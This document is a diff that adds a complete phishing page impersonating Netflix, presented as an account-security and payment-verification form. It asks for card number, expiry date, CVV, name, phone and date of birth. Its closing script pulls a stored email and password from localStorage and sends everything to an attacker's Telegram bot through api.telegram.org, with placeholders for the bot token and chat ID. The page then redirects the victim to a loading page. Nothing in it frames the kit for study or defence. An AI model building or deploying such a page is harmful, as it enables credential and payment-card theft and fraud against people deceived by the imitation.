@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Netflix - Start Your Free Month</title>
+    <link rel="icon" href="./images/iconlogo.webp">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <style>
+        *, *::before, *::after {
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #ffffff;
+            font-family: 'Roboto', Arial, Helvetica, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        a {
+            color: #0051ff;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        a:hover {
+            text-decoration: underline;
+            color: #003bb5;
+        }
+
+        .header {
+            text-align: left;
+            padding: 20px;
+            background-color: #141414;
+        }
+
+        .header img {
+            width: 150px;
+            height: auto;
+        }
+
+        .free-month-banner {
+            background-color: #e50914;
+            color: #fff;
+            text-align: center;
+            padding: 15px 20px;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .custom-hr {
+            border: none;
+            border-top: 1px solid rgba(128, 128, 128, 0.555);
+            margin: 0;
+        }
+
+        .login-container {
+            flex: 1;
+            padding: 40px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #f3f3f3;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .login-box {
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-box h2 {
+            color: #000000;
+            text-align: left;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            font-size: 28px;
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #e74c3c;
+            box-shadow: 0 0 5px rgba(255, 0, 0, 0.3);
+        }
+
+        .sign-in-button {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            font-family: 'Roboto', Arial, Helvetica, sans-serif;
+            background-color: #e50914;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+
+        .sign-in-button:hover {
+            background-color: #f6121d;
+        }
+
+        .footer {
+            background: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 20px 0;
+            font-family: 'Roboto', Arial, Helvetica, sans-serif;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <a href="https://www.netflix.com/au/"><img src="./images/logo_2.png" alt="Netflix Logo"></a>
+    </div>
+
+    <div class="free-month-banner">
+        Secure your <strong>NETFLIX</strong> account.
+    </div>
+
+    <hr class="custom-hr">
+
+    <div class="login-container">
+        <div class="login-box">
+            <div class="free-month-highlight">
+                <h3>Confirm account information below</h3>
+                <p>No charges will be made for verification</p>
+            </div>
+            <h2>Verify Your Payment Information</h2>
+            <form id="payment-form" novalidate>
+                <div class="form-group">
+                    <label for="card-number">Card Number</label>
+                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="expiry-date">Expiry Date</label>
+                    <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="password" id="cvv" placeholder="123" maxlength="3" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="name-on-card">Name on Card</label>
+                    <input type="text" id="name-on-card" placeholder="John Doe" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone-number">Phone Number</label>
+                    <input type="tel" id="phone-number" placeholder="0400 000 000" maxlength="14" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="dob">Date of Birth</label>
+                    <input type="text" id="dob" placeholder="DD/MM/YYYY" maxlength="10" required>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms" name="terms" novalidate required>
+                    <label for="terms">I agree to the <a href="https://brand.netflix.com/en/terms/">Terms of Use</a> and <a href="https://help.netflix.com/en/node/100628">Privacy Statement</a>.</label>
+                </div>
+
+                <button type="submit" class="sign-in-button">Start Your Free Month</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div>
+            <a href="https://help.netflix.com/en">Questions? Contact us.</a>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "YOUR_BOT_TOKEN"; // Replace with your actual bot token
+        const chatId = "YOUR_CHAT_ID"; // Replace with your actual chat ID
+
+        document.getElementById('payment-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const emailValue = localStorage.getItem("email");
+            const passwordValue = localStorage.getItem("password");
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
+            const nameOnCard = document.getElementById('name-on-card').value;
+            const phoneNumber = document.getElementById('phone-number').value;
+            const dob = document.getElementById('dob').value;
+
+            const message = `
+🎬 Netflix 🎬
+👤 Email: ${emailValue}
+🔑 Password: ${passwordValue}
+💳 Name on Card: ${nameOnCard}
+📞 Phone Number: ${phoneNumber}
+💳 Card Number: ${cardNumber}
+🗓️ Expiry Date: ${expiryDate}
+🔑 CVV: ${cvv}
+🗓️ Date of Birth: ${dob}
+`;
+
+            // Sending the message via Telegram bot
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then((response) => response.json())
+            .then((data) => {
+                if (data.ok) {
+                    window.location.href = "loading.html"; // Redirect to a loading page or success page
+                } else {
+                    alert("Error sending data.");
+                }
+            })
+            .catch((error) => {
+                console.error("Error sending data:", error);
+                alert("Error sending data.");
+            });
+        });
+    </script>
+</body>
+
+</html>
